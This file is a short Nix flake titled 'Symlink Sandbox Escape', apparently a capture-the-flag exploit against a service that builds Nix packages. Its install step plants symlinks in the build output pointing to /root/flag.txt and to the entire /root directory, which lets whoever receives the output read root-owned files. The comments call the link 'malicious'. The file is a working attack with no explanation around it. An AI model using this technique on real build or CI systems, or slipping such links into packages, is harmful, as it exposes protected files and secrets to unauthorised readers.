{
  description = "Symlink Sandbox Escape";

  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
  };

  outputs = { self, nixpkgs }: 
  let
    system = "x86_64-linux";
    pkgs = import nixpkgs { inherit system; };
  in {
    packages.${system}.default = pkgs.stdenv.mkDerivation {
      pname = "symlink-escape";
      version = "1.0";
      src = ./.;

      # Do nothing during the build phase, just succeed.
      buildPhase = "true";

      installPhase = ''
        mkdir -p $out
        
        # Create a malicious symlink pointing directly to the locked flag
        ln -s /root/flag.txt $out/flag.txt
        
        # Bonus: Let's symlink the entire root directory just in case it zips the output
        ln -s /root $out/root_dir
      '';
    };
  };
}
